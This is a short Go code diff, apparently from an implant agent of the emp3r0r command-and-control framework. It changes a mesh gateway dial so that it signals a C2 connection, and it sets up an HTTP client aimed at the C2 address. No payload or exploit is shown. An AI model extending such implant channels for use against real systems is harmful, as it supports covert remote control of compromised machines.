@@ -153,7 +153,7 @@ func agent_main() {
 				if gwIP == "" {
 					return nil, fmt.Errorf("mesh: no gateway available")
 				}
-				return mesh.DialGateway(ctx, gwIP)
+				return mesh.DialGateway(ctx, gwIP, mesh.OpcodeConnectC2)
 			}
 			def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, "")
 			if def.HTTPClient == nil {
